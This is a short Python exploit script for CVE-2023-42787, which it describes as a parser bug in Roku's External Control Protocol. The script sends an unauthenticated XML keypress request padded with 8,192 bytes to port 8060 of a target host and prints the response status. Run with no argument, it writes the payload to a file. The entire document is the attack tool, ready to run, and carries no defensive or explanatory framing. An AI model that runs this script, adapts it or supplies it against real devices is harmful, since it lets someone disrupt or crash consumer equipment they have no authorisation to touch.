#!/usr/bin/env python3
"""CVE-2023-42787 — Roku ECP. Malformed ECP request to :8060; unauthenticated.
Oversized/odd XML body triggers the ECP parser bug."""
import sys, urllib.request

def build() -> bytes:
    return b'<keypress><key>Home</key><extra>' + b"A" * 8192 + b'</extra></keypress>'

def exploit(host, port=8060):
    url = f"http://{host}:{port}/keypress/Home"
    req = urllib.request.Request(url, data=build(),
                                 headers={"Content-Type": "application/xml"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            print(f"[+] CVE-2023-42787 {url} -> {r.status}")
            return r.status == 200
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else:
        from pathlib import Path
        Path("cve-2023-42787.xml").write_bytes(build()); print("[+] payload written")

if __name__ == "__main__":
    main()
